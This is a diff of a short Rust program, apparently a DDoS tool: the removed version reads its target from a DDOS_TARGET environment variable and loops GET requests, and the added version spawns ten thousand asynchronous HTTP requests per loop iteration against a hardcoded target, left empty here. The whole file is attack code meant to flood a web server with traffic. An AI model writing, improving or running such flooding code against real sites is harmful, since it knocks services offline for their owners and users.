@@ -1,31 +1,26 @@
-#![allow(unused_must_use)]
+use core::panic;
 
 use reqwest::Client;
 
 #[tokio::main]
 async fn main() {
-    let target: String;
-    let mut i: i64 = 1;
-
-    if let Ok(env) = std::env::var("DDOS_TARGET") {
-        target = env;
-    } else {
-        println!("DDOS_TARGET not set");
-        std::process::exit(1);
-    }
-
-    let http_client = Client::new();
+    let threadspawn = 10000;
+    let target: &str;
+    target = "";
 
     loop {
-        println!("{} | Sending request to {}", i, &target);
-        i += 1;
+        for _j in 0..threadspawn {
+            let http_client = Client::new();
 
-        let request = http_client.get(&target).send().await;
+            tokio::spawn(async move {
+                let request = http_client.get(target).body("basic string").send().await;
 
-        if let Ok(response) = request {
-            println!("Response: {}", response.status());
-        } else {
-            println!("Request failed");
+                if let Ok(response) = request {
+                    println!("Response: {}", response.status());
+                } else {
+                    println!("Request failed");
+                }
+            });
         }
     }
 }
